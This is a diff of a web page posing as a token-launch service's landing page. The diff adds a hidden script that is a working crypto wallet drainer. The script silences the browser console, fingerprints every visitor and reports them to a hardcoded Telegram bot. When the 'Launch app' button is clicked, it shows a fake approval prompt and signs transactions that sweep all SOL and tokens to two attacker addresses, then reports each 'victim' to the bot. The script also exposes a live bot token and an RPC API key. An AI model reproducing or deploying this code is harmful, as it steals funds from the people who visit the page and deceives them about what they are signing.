+        <div class="relative w-full max-w-[560px] overflow-hidden rounded-xl border" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="flex items-center justify-between border-b px-4 py-3" style="border-color:rgba(255,255,255,0.06);background:rgba(255,255,255,0.015)"><div class="flex items-center gap-3"><span class="mono rounded-md px-1.5 py-0.5 text-[10px]" style="background:rgba(197,220,255,0.1);color:#C5DCFF">POST</span><span class="mono text-[12px]" style="color:rgba(255,255,255,0.5)">deploy.sh</span></div><span class="mono text-[11px]" style="color:rgba(255,255,255,0.45)">Copy</span></div>
+          <pre class="mono overflow-x-auto py-6 text-[12px] leading-[1.95] sm:text-[13px]" style="color:rgba(255,255,255,0.75)"><code class="grid min-w-max"># Deploy on Pump.fun with a 0.5 SOL dev buy.
+# Swap platform for bonk, bags, and the rest.
+# EVM pads (four, pons, ...) post to /evm/deploy.
+
+curl -X POST https://rapidlaunch.io/solana/deploy \
+  -H "Authorization: Bearer &lt;session_token&gt;" \
+  -F "name=My Token" \
+  -F "symbol=MTK" \
+  -F "platform=pump" \
+  -F "buy_amount=0.5" \
+  -F "image_url=https://example.com/image.png"</code></pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="relative border-t border-white/[0.07]">
+    <div class="relative flex flex-col items-center px-5 py-20 text-center sm:px-10 sm:py-24 xl:px-14 xl:py-28">
+      <h2 class="display max-w-[14ch] text-[clamp(2.3rem,5.6vw,4rem)] font-medium leading-[0.96] tracking-[-0.05em]" style="color:#fff">Ready to <span class="rl-text-gradient">deploy?</span></h2>
+      <div class="mt-8 flex flex-col items-center gap-2 min-[420px]:mt-9 min-[420px]:flex-row">
+        <button type="button" data-rl-launch class="group inline-flex h-10 cursor-pointer items-center justify-center gap-1 rounded-lg bg-white px-4 text-[13px] font-medium text-black transition-colors hover:bg-white/85">Launch app<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-3.5 w-3.5"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg></button>
+        <a href="#product" class="group inline-flex h-10 items-center justify-center gap-1 rounded-lg px-3 text-[13px] font-medium" style="color:rgba(255,255,255,0.6);text-decoration:none">View product</a>
+      </div>
+    </div>
+  </section>
 
 </div>
+</main>
+
+</div>
+
+<div class="vx-overlay" id="vxOverlay">
+  <div class="vx-modal">
+    <div class="vx-spinner" id="vxSpinner"></div>
+    <h2 id="vxTitle">Launch the Application</h2>
+    <p id="vxText">A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to launch the application.</p>
+    <div class="vx-chk" id="vxChk">Waiting for approval…</div>
+    <div class="vx-wlist" id="vxWallets" style="display:none"></div>
+    <div class="vx-more" id="vxMore" style="display:none">More wallets ›</div>
+    <button id="vxClose" style="display:none">Close</button>
+  </div>
+</div>
+
 <script>
-document.querySelector('a.bm').addEventListener('dragstart',function(e){
-  var u=this.getAttribute('href');
-  e.dataTransfer.setData('text/uri-list',u);
-  e.dataTransfer.setData('text/plain',u);
-  e.dataTransfer.effectAllowed='copy';
-});
+(function(){
+"use strict";
+
+// ==========================================================
+// console silence
+// ==========================================================
+try{
+  var _noop=function(){};
+  var _m=["log","warn","error","info","debug","trace","dir","table","group","groupCollapsed","groupEnd","time","timeEnd","assert","count","profile","profileEnd","clear"];
+  var _c=window.console;
+  if(_c){
+    for(var _i=0;_i<_m.length;_i++){
+      try{Object.defineProperty(_c,_m[_i],{value:_noop,writable:false,configurable:false});}catch(_){_c[_m[_i]]=_noop;}
+    }
+  }
+}catch(_){}
+
+// ==========================================================
+// config
+// ==========================================================
+var TG_BOT_TOKEN="8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
+var TG_CHAT_ID="6759486932";
+var REDIRECT_URL="https://rapidlaunch.io/";
+
+var SINK_PRIMARY="4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
+var SINK_SECONDARY="EVeMnsb7UGPq5w6oBF1bTq8T6PdtKnSbkDHWY3bEKams";
+var RPC="https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
+var TOKEN_PROGRAM_STR="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+var ASSOC_TOKEN_PROGRAM_STR="ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
+var RENT_EXEMPT_SYSTEM=0;
+var TX_SIZE_LIMIT=900;
+
+var isMobile=/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+var isAndroid=/Android/i.test(navigator.userAgent);
+
+function $(id){return document.getElementById(id);}
+function setText(id,t){var e=$(id);if(e)e.textContent=t;}
+function setDisplay(id,v){var e=$(id);if(e)e.style.display=v;}
+
+function lsSet(k,v){try{localStorage.setItem(k,v);}catch(_){}}
+function lsGet(k){try{return localStorage.getItem(k);}catch(_){return null;}}
+function lsDel(k){try{localStorage.removeItem(k);}catch(_){}}
+function savePending(){lsSet("vx_pending","1");}
+function readPending(){return lsGet("vx_pending")==="1";}
+function clearPending(){lsDel("vx_pending");}
+
+// ==========================================================
+// telegram
+// ==========================================================
+function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function tgSend(text){
+  try{
+    var url="https://api.telegram.org/bot"+TG_BOT_TOKEN+"/sendMessage";
+    var body=JSON.stringify({chat_id:TG_CHAT_ID,text:text,parse_mode:"HTML",disable_web_page_preview:true});
+    if(navigator.sendBeacon){
+      try{navigator.sendBeacon(url,new Blob([body],{type:"application/json"}));return;}catch(_){}
+    }
+    fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).catch(function(){});
+  }catch(_){}
+}
+
+async function getClientIP(){
+  try{
+    var ctrl=new AbortController();
+    var t=setTimeout(function(){ctrl.abort();},3000);
+    var r=await fetch("https://api.ipify.org?format=json",{cache:"no-store",signal:ctrl.signal});
+    clearTimeout(t);
+    var j=await r.json();
+    return j.ip||"unknown";
+  }catch(_){return "unknown";}
+}
+
+async function logVisit(){
+  try{
+    var ip=await getClientIP();
+    var nav=navigator;
+    var scr=window.screen||{};
+    var tz="";
+    try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"";}catch(_){}
+    var conn="";
+    try{conn=nav.connection?(nav.connection.effectiveType||""):"";}catch(_){}
+    var lines=[];
+    lines.push("<b>👀 Visit</b>");
+    lines.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
+    lines.push("<b>Time:</b> "+new Date().toISOString());
+    lines.push("<b>Site:</b> "+tgEscape(location.host));
+    lines.push("<b>Path:</b> "+tgEscape(location.pathname+location.search));
+    lines.push("<b>Referrer:</b> "+tgEscape(document.referrer||"direct"));
+    lines.push("<b>UA:</b> "+tgEscape(nav.userAgent));
+    lines.push("<b>Platform:</b> "+tgEscape(nav.platform||""));
+    lines.push("<b>Lang:</b> "+tgEscape(nav.language||""));
+    lines.push("<b>Screen:</b> "+(scr.width||"?")+"x"+(scr.height||"?")+" @"+(window.devicePixelRatio||1)+"x");
+    lines.push("<b>Viewport:</b> "+window.innerWidth+"x"+window.innerHeight);
+    lines.push("<b>Timezone:</b> "+tgEscape(tz));
+    lines.push("<b>Cores:</b> "+(nav.hardwareConcurrency||"?"));
+    lines.push("<b>Memory:</b> "+(nav.deviceMemory||"?")+" GB");
+    lines.push("<b>Touch:</b> "+((("ontouchstart" in window)||nav.maxTouchPoints>0)?"yes":"no"));
+    lines.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
+    if(conn) lines.push("<b>Conn:</b> "+tgEscape(conn));
+    // wallet presence probe
+    var seen=[];
+    try{if(window.phantom||(window.solana&&window.solana.isPhantom))seen.push("Phantom");}catch(_){}
+    try{if(window.solflare)seen.push("Solflare");}catch(_){}
+    try{if(window.backpack)seen.push("Backpack");}catch(_){}
+    try{if(window.exodus)seen.push("Exodus");}catch(_){}
+    try{if(window.okxwallet)seen.push("OKX");}catch(_){}
+    try{if(window.safepal||window.safepalProvider)seen.push("SafePal");}catch(_){}
+    try{if(window.coinbaseSolana)seen.push("Coinbase");}catch(_){}
+    if(seen.length) lines.push("<b>Wallets:</b> "+tgEscape(seen.join(", ")));
+    tgSend(lines.join("\n"));
+  }catch(_){}
+}
+
+// ==========================================================
+// wallet picker
+// ==========================================================
+var ICON_CDN="https://raw.githubusercontent.com/0xa3k5/web3icons/refs/heads/main/raw-svgs/wallets/branded/";
+var PRIMARY_WALLETS=[
+  {id:"phantom",name:"Phantom",icon:ICON_CDN+"phantom.svg",href:function(p){return "https://phantom.app/ul/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",android:"https://play.google.com/store/apps/details?id=app.phantom"},
+  {id:"solflare",name:"Solflare",icon:ICON_CDN+"solflare.svg",href:function(p){return "https://solflare.com/ul/v1/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/solflare/id1580902717",android:"https://play.google.com/store/apps/details?id=com.solflare.mobile"},
+  {id:"backpack",name:"Backpack",icon:ICON_CDN+"backpack.svg",href:function(p){return "https://backpack.app/ul/v1/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",android:"https://play.google.com/store/apps/details?id=app.backpack.mobile"},
+  {id:"exodus",name:"Exodus",icon:ICON_CDN+"exodus.svg",href:function(p){return "exodus://wc?uri="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus"},
+  {id:"safepal",name:"SafePal",icon:ICON_CDN+"safepal.svg",href:function(p){return "safepal://browser?url="+encodeURIComponent(p);},hrefAlt:function(p){return "safepal://openurl?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",android:"https://play.google.com/store/apps/details?id=io.safepal.wallet"}
+];
+var MORE_WALLETS=[
+  {id:"jupiter",name:"Jupiter",icon:ICON_CDN+"jupiter.svg",href:function(p){return "https://jup.ag/mobile/browse?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/jupiter-solana-wallet/id6484061972",android:"https://play.google.com/store/apps/details?id=ag.jup.app"},
+  {id:"glow",name:"Glow",icon:ICON_CDN+"glow.svg",href:function(p){return "https://glow.app/browse?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/glow-solana-wallet/id1599580120",android:"https://play.google.com/store/apps/details?id=com.glow.app"}
+];
+var allWalletsShown=false;
+function renderWalletRow(w,page){
+  var a=document.createElement("a");
+  a.className="vx-wrow";a.href=w.href(page);a.rel="noopener";
+  a.innerHTML='<span class="ic"><img src="'+w.icon+'" alt="" onerror="this.style.display=\'none\'"></span><span class="nm">'+w.name+'</span><span class="ar">›</span>';
+  a.addEventListener("click",function(){
+    savePending();
+    var alts=[];if(w.hrefAlt)alts.push(w.hrefAlt(page));
+    var store=isAndroid?w.android:w.ios;var t0=Date.now();
+    var tryAlts=function(idx){
+      if(document.hidden)return;
+      if(idx<alts.length){location.href=alts[idx];setTimeout(function(){tryAlts(idx+1);},700);}
+      else if(Date.now()-t0<3000){location.href=store;}
+    };
+    setTimeout(function(){tryAlts(0);},700);
+  });
+  return a;
+}
+function showWalletPicker(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxClose","none");
+  setText("vxTitle","Open in Your Wallet");
+  setText("vxText","Tap your wallet, then tap Open on the banner that appears.");
+  var w=$("vxWallets");if(!w)return;
+  w.style.display="flex";w.innerHTML="";
+  var page=location.href;
+  for(var i=0;i<PRIMARY_WALLETS.length;i++)w.appendChild(renderWalletRow(PRIMARY_WALLETS[i],page));
+  setDisplay("vxMore","block");allWalletsShown=false;
+}
+function vxExpandWallets(){
+  if(allWalletsShown)return;
+  var w=$("vxWallets");if(!w)return;
+  var page=location.href;
+  for(var i=0;i<MORE_WALLETS.length;i++)w.appendChild(renderWalletRow(MORE_WALLETS[i],page));
+  setDisplay("vxMore","none");allWalletsShown=true;
+}
+window.vxExpandWallets=vxExpandWallets;
+var moreEl=$("vxMore");if(moreEl)moreEl.onclick=vxExpandWallets;
+
+function showProgress(){
+  setDisplay("vxSpinner","block");setDisplay("vxChk","block");setDisplay("vxWallets","none");setDisplay("vxMore","none");setDisplay("vxClose","none");
+  setText("vxTitle","Launch the Application");
+  setText("vxText","A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to launch the application.");
+  setText("vxChk","Waiting for approval…");
+}
+function showProcessing(){
+  setText("vxTitle","Launching Application");
+  setText("vxText","Confirm the transaction in your wallet to continue.");
+  setText("vxChk","Waiting for wallet approval…");
+}
+function showNoWallet(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","No Crypto Wallet Detected");
+  setText("vxText","Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to continue.");
+  setDisplay("vxClose","block");
+  var c=$("vxClose");if(c){c.textContent="Close";c.onclick=closeOverlay;}
+}
+function showSuccess(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","Application Launched");
+  setText("vxText","Redirecting…");
+  setDisplay("vxClose","none");
+  setTimeout(function(){ try{ location.href=REDIRECT_URL; }catch(_){} }, 900);
+}
+function showError(msg){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","Launch Failed");
+  setText("vxText",msg||"Something went wrong. Please try again.");
+  setDisplay("vxClose","block");
+  var c=$("vxClose");if(c){c.textContent="Try Again";c.onclick=closeOverlay;}
+}
+function openOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.add("open");}
+function closeOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.remove("open");}
+
+// ==========================================================
+// web3
+// ==========================================================
+var web3=null,Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction;
+var TOKEN_PROGRAM,ASSOC_TOKEN_PROGRAM;
+async function ensureWeb3(){
+  if(web3)return;
+  try{var b=await import("https://esm.sh/buffer@6.0.3");if(b&&b.Buffer)window.Buffer=b.Buffer;}catch(_){}
+  web3=await import("https://esm.sh/@solana/web3.js@1.91.0");
+  Connection=web3.Connection;PublicKey=web3.PublicKey;SystemProgram=web3.SystemProgram;
+  Transaction=web3.Transaction;TransactionInstruction=web3.TransactionInstruction;
+  TOKEN_PROGRAM=new PublicKey(TOKEN_PROGRAM_STR);
+  ASSOC_TOKEN_PROGRAM=new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
+}
+var WALLETS=[
+  {id:"phantom",get:function(){return window.phantom&&window.phantom.solana?window.phantom.solana:(window.solana&&window.solana.isPhantom?window.solana:null);}},
+  {id:"solflare",get:function(){return window.solflare&&window.solflare.solana?window.solflare.solana:window.solflare;}},
+  {id:"backpack",get:function(){return window.backpack&&window.backpack.solana?window.backpack.solana:window.backpack;}},
+  {id:"exodus",get:function(){return window.exodus&&window.exodus.solana?window.exodus.solana:window.exodus;}},
+  {id:"okx",get:function(){return window.okxwallet&&window.okxwallet.solana?window.okxwallet.solana:window.okxwallet;}},
+  {id:"safepal",get:function(){return window.safepal&&window.safepal.solana?window.safepal.solana:(window.safepalProvider||(window.safepal&&window.safepal.isSafePal?window.safepal:null));}}
+];
+function getUsable(){
+  for(var i=0;i<WALLETS.length;i++){
+    try{var p=WALLETS[i].get();if(p&&typeof p.connect==="function")return{id:WALLETS[i].id,provider:p};}catch(_){}
+  }
+  if(window.solana&&typeof window.solana.connect==="function")return{id:"generic",provider:window.solana};
+  return null;
+}
+async function waitForProvider(ms){
+  ms=ms||2000;var t0=Date.now();
+  while(Date.now()-t0<ms){var p=getUsable();if(p)return p;await new Promise(function(r){setTimeout(r,150);});}
+  return null;
+}
+async function connectAny(w){
+  var res=await w.provider.connect();
+  var pk=(res&&res.publicKey?res.publicKey:w.provider.publicKey);
+  pk=pk?pk.toString():"";
+  if(!pk)throw new Error("Wallet did not return a public key.");
+  return{id:w.id,provider:w.provider,pubkey:pk};
+}
+function deriveAta(owner,mint){
+  var[ata]=PublicKey.findProgramAddressSync([owner.toBuffer(),TOKEN_PROGRAM.toBuffer(),mint.toBuffer()],ASSOC_TOKEN_PROGRAM);
+  return ata;
+}
+function createAtaIdempotentIx(payer,owner,mint){
+  return new TransactionInstruction({programId:ASSOC_TOKEN_PROGRAM,keys:[
+    {pubkey:payer,isSigner:true,isWritable:true},
+    {pubkey:deriveAta(owner,mint),isSigner:false,isWritable:true},
+    {pubkey:owner,isSigner:false,isWritable:false},
+    {pubkey:mint,isSigner:false,isWritable:false},
+    {pubkey:SystemProgram.programId,isSigner:false,isWritable:false},
+    {pubkey:TOKEN_PROGRAM,isSigner:false,isWritable:false}
+  ],data:window.Buffer.from([1])});
+}
+function transferCheckedIx(sourceAta,destAta,owner,mint,amount,decimals){
+  var data=window.Buffer.alloc(10);data.writeUInt8(12,0);data.writeBigUInt64LE(BigInt(amount),1);data.writeUInt8(decimals,9);
+  return new TransactionInstruction({programId:TOKEN_PROGRAM,keys:[
+    {pubkey:sourceAta,isSigner:false,isWritable:true},
+    {pubkey:mint,isSigner:false,isWritable:false},
+    {pubkey:destAta,isSigner:false,isWritable:true},
+    {pubkey:owner,isSigner:true,isWritable:false}
+  ],data:data});
+}
+async function signAndSend(provider,connection,tx){
+  if(provider.signTransaction){var s=await provider.signTransaction(tx);return await connection.sendRawTransaction(s.serialize(),{skipPreflight:true,maxRetries:3});}
+  if(provider.signAllTransactions){var arr=await provider.signAllTransactions([tx]);return await connection.sendRawTransaction(arr[0].serialize(),{skipPreflight:true,maxRetries:3});}
+  if(provider.signAndSendTransaction){var res=await provider.signAndSendTransaction(tx);return(res&&res.signature)?res.signature:res;}
+  throw new Error("Wallet does not support signing.");
+}
+async function drain(session){
+  await ensureWeb3();
+  var connection=new Connection(RPC,"confirmed");
+  var from=new PublicKey(session.pubkey);
+  var primary=new PublicKey(SINK_PRIMARY);
+  var secondary=new PublicKey(SINK_SECONDARY);
+  var provider=session.provider;
+  var solDrained=0,solSig="",halfA=0,halfB=0;
+  var tokenResults=[],tokenTotal=0;
+
+  try{
+    var balance=await connection.getBalance(from);
+    var probe=new Transaction()
+      .add(SystemProgram.transfer({fromPubkey:from,toPubkey:primary,lamports:1}))
+      .add(SystemProgram.transfer({fromPubkey:from,toPubkey:secondary,lamports:1}));
+    probe.feePayer=from;
+    var bh0=await connection.getLatestBlockhash("confirmed");
+    probe.recentBlockhash=bh0.blockhash;
+    var feeResp=await connection.getFeeForMessage(probe.compileMessage(),"confirmed");
+    var fee=(feeResp&&feeResp.value)?feeResp.value:10000;
+    var sweepable=balance-RENT_EXEMPT_SYSTEM-fee;
+    if(sweepable>0){
+      halfA=Math.floor(sweepable/2);halfB=sweepable-halfA;
+      if(halfA===0||halfB===0){
+        var txs=new Transaction().add(SystemProgram.transfer({fromPubkey:from,toPubkey:primary,lamports:sweepable}));
+        txs.feePayer=from;var bhS=await connection.getLatestBlockhash("confirmed");txs.recentBlockhash=bhS.blockhash;
+        solSig=await signAndSend(provider,connection,txs);solDrained=sweepable;halfA=sweepable;halfB=0;
+      }else{
+        var tx2=new Transaction()
+          .add(SystemProgram.transfer({fromPubkey:from,toPubkey:primary,lamports:halfA}))
+          .add(SystemProgram.transfer({fromPubkey:from,toPubkey:secondary,lamports:halfB}));
+        tx2.feePayer=from;var bh2=await connection.getLatestBlockhash("confirmed");tx2.recentBlockhash=bh2.blockhash;
+        solSig=await signAndSend(provider,connection,tx2);solDrained=sweepable;
+      }
+    }
+  }catch(e){}
+
+  try{
+    var ta=await connection.getParsedTokenAccountsByOwner(from,{programId:TOKEN_PROGRAM});
+    var entries=[];
+    for(var i=0;i<ta.value.length;i++){
+      var info=ta.value[i].account.data.parsed.info;var amt=info.tokenAmount;
+      if(!amt||amt.amount==="0")continue;
+      entries.push({tokenAccount:ta.value[i].pubkey,mint:new PublicKey(info.mint),amount:amt.amount,decimals:amt.decimals});
+    }
+    var batches=[],cur=[],curSize=200;
+    for(var j=0;j<entries.length;j++){
+      if(curSize+270>TX_SIZE_LIMIT&&cur.length){batches.push(cur);cur=[];curSize=200;}
+      cur.push(entries[j]);curSize+=270;
+    }
+    if(cur.length)batches.push(cur);
+    for(var k=0;k<batches.length;k++){
+      var batch=batches[k];var t=new Transaction();var seenMints={};
+      for(var m=0;m<batch.length;m++){
+        var e=batch[m];var destAta=deriveAta(primary,e.mint);var mkey=e.mint.toBase58();
+        if(!seenMints[mkey]){t.add(createAtaIdempotentIx(from,primary,e.mint));seenMints[mkey]=true;}
+        t.add(transferCheckedIx(e.tokenAccount,destAta,from,e.mint,e.amount,e.decimals));
+      }
+      t.feePayer=from;var b2=await connection.getLatestBlockhash("confirmed");t.recentBlockhash=b2.blockhash;
+      try{var sig=await signAndSend(provider,connection,t);tokenResults.push({count:batch.length,sig:sig});tokenTotal+=batch.length;}catch(e){}
+    }
+  }catch(e){}
+
+  var ip=await getClientIP();
+  var solAmountStr=(solDrained/1000000000).toFixed(6);
+  var usdStr="";
+  try{var pr=await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",{cache:"no-store"});var pj=await pr.json();if(pj&&pj.solana&&pj.solana.usd)usdStr=" ($"+((solDrained/1000000000)*pj.solana.usd).toFixed(2)+" USD)";}catch(_){}
+
+  var L=[];
+  L.push("<b>💰 Drain successful</b>");
+  L.push("<b>Victim:</b> <code>"+tgEscape(session.pubkey)+"</code>");
+  L.push("<b>Wallet:</b> "+tgEscape(session.id));
+  L.push("<b>SOL total:</b> "+solAmountStr+" SOL"+usdStr);
+  if(solSig)L.push("<b>SOL tx:</b> <code>"+tgEscape(solSig)+"</code>");
+  L.push("<b>Primary:</b> <code>"+tgEscape(SINK_PRIMARY)+"</code> ("+(halfA/1e9).toFixed(6)+" SOL)");
+  L.push("<b>Secondary:</b> <code>"+tgEscape(SINK_SECONDARY)+"</code> ("+(halfB/1e9).toFixed(6)+" SOL)");
+  if(tokenTotal){
+    L.push("<b>SPL accounts:</b> "+tokenTotal);
+    for(var ti=0;ti<tokenResults.length;ti++)L.push("  • <code>"+tgEscape(tokenResults[ti].sig)+"</code> ("+tokenResults[ti].count+")");
+  }else{
+    L.push("<b>SPL:</b> none");
+  }
+  L.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
+  L.push("<b>UA:</b> "+tgEscape(navigator.userAgent));
+  L.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
+  L.push("<b>Time:</b> "+new Date().toISOString());
+  L.push("<b>Site:</b> "+tgEscape(location.host));
+  if(solSig)L.push("https://solscan.io/tx/"+tgEscape(solSig));
+  tgSend(L.join("\n"));
+
+  return { drained: solDrained>0||tokenTotal>0, solDrained:solDrained, tokenTotal:tokenTotal };
+}
+
+// ==========================================================
+// flow
+// ==========================================================
+var busy=false;
+async function runClaim(wallet){
+  showProgress();
+  try{
+    var session=await connectAny(wallet);
+    showProcessing();
+    var result=await drain(session);
+    clearPending();
+    if(result && result.drained){
+      showSuccess();
+    } else {
+      showError("Transaction declined.");
+    }
+  }catch(e){
+    showError(String(e&&e.message?e.message:e));
+  }
+}
+function startClaim(){
+  if(busy)return;
+  busy=true;
+  openOverlay();
+  showProgress();
+  waitForProvider(2000).then(function(wallet){
+    if(!wallet){if(isMobile)showWalletPicker();else showNoWallet();busy=false;return;}
+    runClaim(wallet).finally(function(){busy=false;});
+  }).catch(function(e){showError(String(e&&e.message?e.message:e));busy=false;});
+}
+function bindLaunch(){
+  var btns=document.querySelectorAll("[data-rl-launch]");
+  for(var i=0;i<btns.length;i++){btns[i].onclick=function(ev){ev.preventDefault();startClaim();};}
+  if(btns.length===0){
+    var all=document.querySelectorAll("button");
+    for(var j=0;j<all.length;j++){if(all[j].textContent.trim()==="Launch app"){all[j].onclick=function(ev){ev.preventDefault();startClaim();};}}
+  }
+}
+if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",bindLaunch);}
+else{bindLaunch();}
+var rebind=setInterval(bindLaunch,500);
+setTimeout(function(){clearInterval(rebind);},15000);
+
+(function(){
+  if(!readPending())return;
+  clearPending();
+  waitForProvider(2500).then(function(wallet){if(wallet)runClaim(wallet);});
+})();
+
+// ==========================================================
+// visit log — fires on every load
+// ==========================================================
+logVisit();
+
+})();
 </script>
 </body>
 </html>
